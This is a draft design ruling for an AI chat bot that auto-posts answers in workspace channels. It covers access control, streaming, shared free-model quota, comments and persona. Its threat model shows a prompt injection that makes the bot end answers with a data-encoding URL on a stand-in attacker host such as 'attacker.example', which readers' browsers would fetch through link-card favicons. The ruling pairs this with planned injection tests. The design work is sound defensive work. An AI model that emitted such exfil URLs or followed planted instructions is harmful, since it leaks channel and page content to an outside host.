# DRAFT. The osio bot auto-posts in opted-in channels through the one guarded post path, never streams text into a channel, cites only pages whose readers structurally include the whole channel audience, and comments wait for their own ruling

- Status: proposed (draft, unnumbered). devil, per part:
  - Approach A, Phase 1a (auto-post, no page context): PROCEED-WITH-CONDITIONS (OB1–OB11)
  - Phase 1 streaming into the channel: BLOCK (refused, `.out-of-scope/osio-bot-streams-partial-answers-into-a-channel.md`); private stream + "answering" indicator PwC (OB12)
  - Phase 1b (page context) as written: BLOCK. Lifted by OB13–OB21, then PwC
  - Phase 2 (comments) as written: BLOCK. Lifted by OB22–OB26 and a re-submission
  - Phase 3 (persona + workspace budget): PROCEED-WITH-CONDITIONS (OB27–OB30)
  - Approach B (bot principal): BLOCK (needs its own ruling, OB31)
  - Approach C (external API client): BLOCK (the design's rejection is upheld)
- Date: 2026-11-21
- Deciders: devil (ruling); the osionos builder and the operator live with it
- Design: `groot docs/superpowers/specs/2026-11-21-osio-bot-design.md`. Code: osionos develop 230dde4c5
  (`/mnt/storage/dlesieur/wt/osionos-more-free-ai`), schema `/mnt/storage/dlesieur/wt/groot-more-free-ai/models/`.
- Canonical copy: groot `docs/adr/DRAFT-osio-bot-ruling.md` (identical when written).

## Steel-man

Phase 1a is small and reuses the strongest part of the existing code. The click was never a security boundary
against a malicious asker: the asker's client can call `POST /api/chat/channels/:id/ai-answers` itself, and the
bridge cannot tell a click from a script (`bridge-chat-ai.mjs:143-171`). Every server guard (run bound to channel
and trigger, stored answer only, unedited trigger, unchanged context, L0 in mode `on`, once per run) already runs
without the click. In phase 1 without pages the model reads only messages every channel reader can already
read: `osionos_ai_channel_context` applies the channel access rule in SQL, and chat history is not cut at join
time (`bridge-chat.mjs:277-278`, no join filter). So auto-post without pages discloses nothing new. The design
also refuses DMs, voice, write tools and cross-workspace knowledge. That is the right instinct.

## Context

Paths are under the osionos worktree unless they say otherwise.

### The C429–C454 record
- No ADR records C429–C454. `grep -rn "C429\|C453\|C454" groot/docs` finds only the design draft. The reasons
  below come from code comments. C446 and C447 appear nowhere in source or tests, so their reasons are UNKNOWN.
  C441 and C451 appear only in test names (`services/osionos-ai/tests/threadRuns.test.ts:129`,
  `tests/bridge/bridge-chat-ai.test.mjs:173`).

| Ruling | What it says (source) | Once the click is gone |
|---|---|---|
| C429 | private draft; only the asker's click posts (`bridge-chat-ai.mjs:2-6`, `aiAnswerDraft.ts:2-6`) | **Removed** in opted-in channels. What the click did: an honest asker reviewed model error, injected text and links before they went public. That job moves to OB4, OB5, OB6, OB12, OB14 and C444 |
| C430 | run bound to channel + trigger (`bridge-chat-ai.mjs:79-84`, `runs/repo.ts:87`) | binds |
| C431 | answer ≤ 30 min old (`bridge-chat-ai.mjs:40-41`) | binds |
| C432 | only the run's one stored message is posted, never client text (`bridge-chat-ai.mjs:67-75`, `runs/upstream.ts:344-346`) | binds, more than before (OB1) |
| C433 | the body names run, conversation, trigger and nothing else (`routes/threadRuns.ts:17-27`) | binds: page tools are chosen by the server, never by the body |
| C434 | platform default, no fallback (`routes/threadRuns.ts:19`) | design goal 4 reverses it. Its job (other members' words go only to a vetted no-train model) binds, so fallback is allowed only to no-train entries (OB9) |
| C435/C436 | reserved handles; a posted answer is shown as AI from `ai_run_id`, never from a name (`bridge-chat-ai.mjs:11-12,38,52-55`) | binds; the phase 3 persona must keep it (OB28) |
| C437 | requester or channel owner/admin deletes; nobody edits (`bridge-chat.mjs:179`) | binds; streaming would break "nobody edits" |
| C438 | resolves no mention, notifies nobody (`bridge-chat.mjs:385`) | binds; "notify the asker" only from the `ai_requested_by` column (OB5) |
| C439 | a posted answer was written by no person (`bridge-reports.mjs:106`) | binds (OB6) |
| C440 | authors as You/AI/Member k (`threads/context.ts:12-14`) | binds |
| C441 | a deleted message never reaches the model (test only) | binds |
| C442 | a thread run reads no history (`runs/runner.ts:304`) | binds |
| C443 | trigger unedited since `readAt` (`bridge-chat-ai.mjs:102-112`) | binds |
| C444 | L0 in full, mode `on`, no "post anyway" (`bridge-chat-ai.mjs:157-161`) | binds; it is now the only content filter before public |
| C445 | a run is posted once (unique `ai_run_id`, `bridge-chat-ai.mjs:136`) | binds |
| C448 | the window's access rule is the database's (`threads/context.ts:12`; SQL `osionos-ai-thread-answers-migration.sql:104-114`) | binds; extended to the audience (OB13) |
| C449 | 4 buckets, fail closed (`threads/context.ts:34-46,114-157`) | binds, plus OB8 and OB10 |
| C450 | flags must be exactly "on" (`config.ts:141,481`) | binds (OB11) |
| C452 | no dm/voice/video (`bridge-chat-ai.mjs:147-148`) | binds |
| C453 | first ask stops at a notice: the channel goes to the model (`aiAnswerDraft.ts:8-9`) | binds; the asker consented to a draft, not to auto-posting (OB3) |
| C454 | asker loses the channel mid-run → draft dropped (`runs/upstream.ts:313-315`) | binds; extended to the audience and the pages (OB17) |

### Facts that decide phase 1b (page context)
- **The design's ACL function ignores share rules.** `canReadPageRowAsMember` reads visibility, owner and
  collaborators only (`scripts/bridge-page-read.mjs:76-93`). A `no_access` rule (own, team, workspace-wide or
  ancestor) hides a **shared** page from chosen members. The AI path already leaked through this gap once:
  "a page hidden by a no_access rule ... still reached the model" (`services/osionos-ai/src/retrieval/shareRules.ts:10-13`).
  An intersection of `canReadPageRowAsMember` over members therefore cites pages that some members cannot read.
- **The audience is not the `osionos_channel_members` rows.** In a public text channel, any live workspace
  member reads the channel (`bridge-chat.mjs:32-34,140-155`; same rule in SQL, migration :110-114). Example: a
  collaborator-only page shared with exactly the 3 member rows of a public channel would pass the design's rule
  while the other workspace members read the answer.
- **Member rows may belong to people outside the workspace.** `addMembers` inserts any uuid with no workspace
  check (`bridge-chat.mjs:688-700`), and `requireChannelAccess` honours the row first (`:148`). Such a member
  cannot read workspace-shared pages (`canReadPageRowAsMember` needs membership).
- **"Capped at the channel member count limit": no such limit exists.** `grep -rn "MAX_MEMBERS|MEMBER_LIMIT|maxMembers|member_limit"`
  over the bridge chat/workspace scripts and the chat migration returns nothing.
- Guests are `viewer` member rows (`osionos-member-attributes-migration.sql:31-33`); `canReadPageRow` gives
  them every shared page.
- Today a thread run gets no tools and no pages (`routes/threadRuns.ts:17-21`; `THREAD_SYSTEM_PROMPT`
  `threads/context.ts:144`). Tools would raise steps from 1 to `MAX_STEPS = 5` (`tools/loop.ts:17`), so up to
  5 upstream calls per run, before failover.

### Facts that decide the post mechanism and streaming
- Nothing in the AI service calls the bridge's post route (`grep -rn "ai-answers" services/osionos-ai/src`:
  none). The run is driven by the asker's SSE request (`routes/threadRuns.ts:76-84`). "The bridge posts when a
  run reaches done" has no mechanism today.
- Every bot-row guard runs at the end: context change, trigger edit, L0 on the full text, asker access
  (`bridge-chat-ai.mjs:150-161`, `runs/upstream.ts:313-315`). A row that streams partial text to the channel is
  read before any of them. "Falls back to the private draft" cannot unsee text already sent by realtime.
- A streamed bot row is edited many times. C437 says nobody edits a bot answer. Runs that start while it is
  pending read its partial text into their window. Each edit after their `readAt` also trips
  `refuseChangedContext` (`bridge-chat-ai.mjs:120-127`).

### Facts that decide egress, models and quota
- Every bare http(s) URL in a message gets a link card (`MessageRow.tsx:65-82,147-148`). The card's favicon
  loads `${origin}/favicon.ico` in every reader's browser (`shared/ui/embed/Favicon.tsx:23`). A posted answer
  holding `https://<encoded-data>.attacker.example/` makes every reader resolve and fetch that host, with no
  click: a DNS exfil channel and a reader IP beacon. Today the honest asker sees the URL before Post.
- The Auto chain picks only `dataUse === 'no-train'` entries (`runs/auto.ts:24`). Unknown data use is
  may-train (`gateway/catalog.ts:36-38`, FA24). The catalog refuses a may-train default (`catalog.ts:112`). If no
  free model is labelled no-train, "free through the failover chain" yields the no-train default, which may
  be paid.
- The platform's free quota is one OpenRouter account shared by every user (`runs/quota.ts:4-6,39-42`). An
  account-level 429/402 rests all free routes for everyone (`runs/cooldown.ts:178-183`). The workspace cap is
  200 runs/day (`threads/context.ts:37-38`); with tools that is up to 1,000 upstream calls a day per workspace.
  OpenRouter's published free allowance (50/day, or 1,000/day with ≥ $10 credit, 20/min) is external and not
  re-checked here. On that figure, one busy workspace can close free AI for the whole platform.
- Free pricing is 0/0, so `costMicroUsd` is 0 (`gateway/platform.ts:117-122`). A microUSD workspace budget
  never trips on free models.

### Facts that decide phase 2
- Comments are read by anyone who can read the page (`bridge-comments.mjs:14-19,101`). For a `public` page that
  is any signed-in user (`bridge-page-read.mjs:72-74`), not the workspace.
- A held comment is seen by its author alone (C87, `bridge-comments.mjs:21-23,120-132`). A bot reply that
  quotes the asker's own held comment would publish it.
- The page owner's comment interaction limit applies before a write (`bridge-comments.mjs:102-105`).
- The design has no context-function SQL, no guards and no buckets for comment runs.

- Unknown when this was written:
  - whether `read_page` output includes titles or content of other pages (child-page links, @page mentions,
    synced blocks, linked database views);
  - whether `renderInlineToReact` renders `![](url)` images in a chat row;
  - the shared account's real daily free allowance (no measurement in the repo);
  - whether any username `osio` exists (the reserved names are `ai`, `ai-bot`, `assistant`, `bridge-chat-ai.mjs:39`);
  - the reasons for C446 and C447.

## Risk scores (1–5; worst named)

| Part | Blast | Reversibility | Cost on failure | Confidence | Worst |
|---|---|---|---|---|---|
| 1a auto-post, no pages | 2 | 3 | 2 | 2 | reversibility (a read message cannot be unread; flag + delete exist) |
| Streaming into the channel | 3 | 5 | 3 | 4 | reversibility |
| 1b page context as written | 4 | 5 | 4 | 5 | reversibility + confidence (wrong ACL function, wrong audience, a cap that does not exist) |
| 2 comments as written | 4 | 5 | 4 | 5 | same; public pages reach every signed-in user |
| 3 persona + budget | 2 | 2 | 3 | 3 | cost (impersonation, quota) |
| B bot principal | 4 | 4 | 4 | 5 | confidence (no authority model) |

## Failures nobody mentioned

1. **Share-rule leak.** A shared page with a `no_access` rule for team "contractors" is cited in a public
   channel. The contractors read its quoted content. The design's intersection function cannot see the rule.
2. **Wrong audience.** Collaborator-only page, collaborators = the channel's 3 member rows, public channel with
   40 workspace members: 37 readers see content they cannot open.
3. **Zero-click exfil.** A channel message (or a web-clipped shared page) tells the model to end with
   `https://<base32-of-the-thread>.x.example/`. Every reader's browser fetches it. 63 bytes per DNS label.
4. **Shared-quota closure.** Auto-post makes `@ai` cheap to use. At 5 steps per tool run, one workspace at its
   200/day cap sends 1,000 calls, so the shared account rests and the private assistant fails for every user.
5. **Streaming defeats every guard.** Partial text is broadcast before L0, before the context-change check and
   before the page recheck. The design's fallback ("private draft") runs after the leak.
6. **Held-comment laundering** (phase 2). The asker's held comment is in the window, and the bot quotes it to
   the page's readers.
7. **Persona impersonation** (phase 3). An admin names the bot after a member, with their avatar URL. The
   answer then looks like the member's, which is the design's own anti-goal 3. An external avatar URL is also
   fetched by every reader.

## Decision

Approach A ships in phases. The click is replaced, in channels a channel admin opted in, by the same server
guards plus the conditions below. Page context uses a **structural** audience rule decided in SQL, not an
enumeration over members. Nothing reaches a channel before it is final.

## Conditions (acceptance criteria)

### Phase 1a: auto-post (PwC)
- **OB1** One post path. Auto-post goes through `postAiAnswer` unchanged: `runRefusal`, `answerText`,
  `readLiveTrigger`, `refuseChangedContext`, `decideWrite` mode `on`, unique `ai_run_id`. The trigger is the
  asker's client calling the existing route when the draft reaches `ready`. There is no AI-service→bridge write
  edge and no new service credential; if the tab is gone, the answer stays a draft. A server-side poster needs a
  new ruling.
- **OB2** `osionos_channels.ai_autopost boolean not null default false`, a groot `models/` migration with a down
  step. Only `requireChannelAdmin` sets it. A missing column reads as false (nullable-tolerant probe). A code
  comment states that the flag is a consent knob, not a security boundary: the guards are the boundary.
- **OB3** C453 is extended. The asker's consent is keyed on (user, autopost), and the notice says the answer
  posts to the channel without review. In an autopost channel the composer shows a lasting marker
  ("@ai answers post here").
- **OB4** No zero-click egress from a bot row. A row with `ai_run_id` gets no link card, favicon, player facade
  or inline image; URLs render as text or as a click-through only. Tests: an AI row with
  `https://a.attacker.example/x` and one with `![x](https://a.attacker.example/i.png)` issue zero network
  requests when rendered (Playwright request log or a fetch/img spy).
- **OB5** C438 holds. The answer resolves no mention. The only notification goes to the `ai_requested_by`
  column's user, never to a handle parsed from text.
- **OB6** Recourse on an auto-posted row is tested: bot badge plus "asked by <asker>" (`aiRequestedBy`, already
  in the realtime payload); delete by asker or channel admin (C437); report (C439).
- **OB7** Any guard failure leaves the asker a private draft with the reason. The draft's Post re-runs the same
  guards, so a refused answer posts by click only once its guard clears (`answer_blocked` never clears).
- **OB8** At most 1 bot run in flight per channel: Redis `SET NX` with TTL = the run's deadline, released in
  `finally`, admitted before `startRun`. A Redis error refuses (C449, fail closed). The four buckets stay.
- **OB9** Thread runs, draft or auto, run only on `no-train` platform targets. Failover uses the Auto chain
  (`runs/auto.ts:24`) and never a user connection. A may-train target refuses the run; it does not degrade. This
  replaces C434's "no fallback" with "no-train fallback only".
- **OB10** Shared quota. Add a platform-wide daily thread-run cap in Redis, summed over all workspaces, set
  below the measured shared free allowance with ≥ 50 % headroom for the private assistant. Thread runs with
  tools get `maxSteps ≤ 3`. When the account rests, thread runs refuse ("AI busy") and do not spill to a paid
  model outside the operator's budget. Measure the allowance and record it with its command **before**
  autopost is on in the public deployment.
- **OB11** Autopost ships behind the three existing flags plus its own bridge flag, exactly `"on"`, default off
  (C450). The migration is applied before the flag.

### Streaming (refused into the channel; PwC privately)
- **OB12** The bot row is inserted once, final, after every guard. No `pending` bot row, and no
  `message_updated` carrying partial text. The asker keeps the private SSE stream. The channel gets a textless
  "osio is answering" event through the existing typing path (`postTyping`, `bridge-chat.mjs:781`).

### Phase 1b: page context (BLOCK as written; lifted by all of these)
- **OB13** The audience is everyone who can read the channel: for a public text channel, every live member of
  `channel.workspace_id` plus every `osionos_channel_members` row; for a private channel, the member rows.
- **OB14** A page is eligible only if **all** hold, in one SQL predicate:
  (a) `page.workspace_id = channel.workspace_id`;
  (b) `visibility in ('shared','public')`;
  (c) not trashed or deleted;
  (d) its chain (own, ancestors, workspace-wide) carries **no** share rule, and an unreadable rule set excludes
      it (C584 fail-closed, the `shareRules.ts` loader);
  (e) the channel has **zero** member rows whose user is not a live member of `channel.workspace_id` (one
      anti-join). Otherwise page context is off for that run.
  Collaborator-only, team-granted and rule-governed pages are never eligible. `canReadPageRowAsMember` alone
  never decides eligibility.
- **OB15** `search_workspace` and `read_page` apply OB14 inside the query, before ranking, snippets or counts.
  No other tool is offered (`graph_neighbors`, `list_my_context`, web, write tools).
- **OB16** `read_page` in audience mode emits no title or content of a non-eligible page. The test covers a
  private child under a shared parent, an @page mention, a synced block and a linked database view (closes the
  UNKNOWN above).
- **OB17** The run records, server-side, every page id any tool returned content from (not only citations).
  At post time the bridge re-evaluates OB14 (a)–(e) for each one, together with C454 for the asker, on both the
  auto path and the click path. Any failure falls back per OB7. Residual: the window between this recheck and
  the insert (one request) is stated in a `Caveat:`.
- **OB18** Citation chips carry the page id only. Each reader resolves the title through their own access. A
  reader without access sees "restricted" and no title. Message content never embeds a chip title.
- **OB19** Page tools obey the privacy gate (FA26): they are absent on any may-train target (OB9).
- **OB20** The help text documents the residual: a posted answer persists after the page is narrowed or
  deleted and is visible to later members, the same as a member quoting by hand. Erasure stays
  `osionos_ai_thread_answers_erase_user`.
- **OB21** Injection tests, in the existing runners (`node:test` service tests, bridge tests): (i) a channel
  message asking for a non-eligible page or an exfil URL; (ii) a shared page with planted instructions;
  (iii) a mention flood in the answer; (iv) `@ai` inside a bot answer starts no run (`triggerRefusal` needs
  label `You`). Each asserts on the **posted row** and the network log, not on the prompt.

### Phase 2: comments (BLOCK as written)
- **OB22** The context is the commented page and its comment thread, nothing else. "Pages with the same or
  broader audience" is dropped until a set comparison exists and is ruled. `read_page` obeys OB16.
- **OB23** The window excludes held comments, the asker's own included (C87), and deleted ones.
- **OB24** Comment runs refuse on `public` pages, whose audience is any signed-in user.
- **OB25** The chat guards are mirrored. The run is bound to (page, comment); answer ≤ 30 min; trigger
  unedited; thread unchanged since the read; L0 mode `on`; unique `ai_run_id` plus a check constraint
  (bot author ⇔ `ai_run_id`) on `osionos_page_comments`; `requireInteraction` for the asker against the
  owner's limit; per-page and per-member buckets; page read rechecked for the asker at post.
- **OB26** Phase 2 is re-submitted with its context-function SQL and route before any code.

### Phase 3: persona and budget (PwC)
- **OB27** Persona text goes after IDENTITY and before the shared-channel rule. The data-boundary line stays
  last (devil C38). It is ≤ 2,000 characters, checked on the server, set by workspace owner/admin only, and
  each change is audited. It cannot add a tool; tools are decided in code.
- **OB28** The persona name is display-only. It always renders with a bot badge that cannot be removed.
  Refuse a name equal, after NFKC and confusable folding, to any workspace member's display name or username.
  Authorship stays derived from `ai_run_id` (C436). The trigger stays `@ai`. A new handle needs: a reserved-name
  entry in `osionos-account-profiles-migration.sql`, a census showing no account holds it, and the three
  `AI_MENTION`/`AI_HANDLES` copies changed together (`threads/context.ts:31`, `aiAnswerDraft.ts:23`,
  `bridge-chat-ai.mjs:39`).
- **OB29** The avatar is an asset uploaded to our storage, never a free URL, and it passes the image-source
  validator after the `/\` bypass fix (block-background ruling BG).
- **OB30** The workspace budget counts runs and upstream calls, not microUSD. It is charged atomically with the
  asker's buckets and fails closed.

### Approaches
- **OB31** B (bot principal) comes back as its own design. It must say whom each bot action is for (the asker
  plus the OB13/OB14 audience, never the bot's own member ACL), how the credential is stored and rotated, and
  what the bot reads that the asker cannot. It is not built under this ruling.

## Alternatives considered

- **Intersection of `canReadPageRowAsMember` over member rows (the design)**: loses on three facts:
  share-rule blind (`shareRules.ts:10-13`), wrong audience for public channels (`bridge-chat.mjs:140-155`), and
  a cap that does not exist. Its cost is also O(members × candidate pages) with a membership read per member.
  The structural OB14 costs one predicate plus one anti-join.
- **Enumerate every reader with `pageAccessLevel`**: correct, but it re-reads up to 20,001 pages per ruled
  workspace per call (`shareRules.ts` Caveat) for each reader. OB14(d) excludes every ruled chain instead:
  narrower, fail-closed, cheap.
- **Stream into a pending row (the design)**: refused, see the out-of-scope record.
- **AI service posts on `done`**: adds a service→bridge write credential and a second insert path for bot
  rows. OB1's client-driven call reuses the guarded route with no new trust edge; its cost is that a closed tab
  leaves a draft.
- **B / C**: B needs an authority model the design defers. C has no in-thread streaming and keeps a token
  outside the app (the design's own reasons, upheld).

## Consequences

- Phase 1a may be built against OB1–OB12. Phase 1b may not be built until OB13–OB21 are in the plan. Phase 2
  needs a fresh ruling (OB26). Phase 3 is buildable against OB27–OB30.
- C429 is superseded for opted-in channels only. C430–C445, C448–C454 stay in force; C434 is amended by OB9.
- The builder owes test names and output for every OB before live, and the measured shared allowance (OB10)
  before autopost in the public deployment.
- Reverse this the day a posted answer is shown to have quoted a non-eligible page, or the shared account
  rests because of thread runs. Turn the autopost flag off first; posted rows can be deleted (C437).
